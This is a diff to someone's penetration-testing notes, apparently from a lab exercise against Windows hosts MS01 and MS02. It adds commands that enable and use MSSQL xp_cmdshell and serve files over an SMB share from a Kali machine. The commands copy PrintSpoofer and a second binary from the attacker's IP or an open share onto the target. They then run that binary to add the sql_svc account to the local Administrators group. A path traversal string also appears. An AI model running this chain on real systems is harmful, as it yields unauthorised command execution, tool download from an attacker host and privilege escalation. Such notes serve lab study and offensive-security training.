@@ -280,7 +280,21 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
+* file transfer by smbserver:
+(on kali) impacket-smbserver share $(pwd) -smb2support
+				it means: the our smb share is \\kali-ip\share
+(on xp_cmdshell) EXEC xp_cmdshell 'copy \\10.10.14.5\share\PrintSpoofer.exe C:\Users\Public\ps.exe';
 
+* Tricky Transfer File to MS02, so we have to:
+MS01: net share Myshare=C:\temp /GRANT:Everyone,FULL
+MS01: icacls "C:\temp\print.exe" /grant Everyone:R
+MS01: icacls "C:\temp\" /grant Everyone:RX
+
+MS02(MSSQL): EXEC xp_cmdshell 'net use Z: \\10.10.79.147\Myshare';
+MS02(MSSQL): EXEC xp_cmdshell 'copy Z:\print.exe C:\Users\Public\print.exe';
+
+MS02(MSSQL): EXEC xp_cmdshell 'C:\Users\Public\print.exe -c "net localgroup Administrators sql_svc /add"';
+MS02(MSSQL): EXEC xp_cmdshell 'net localgroup Administrators';
 
 * path traversal vuln:
 ../../../../../../../../../............
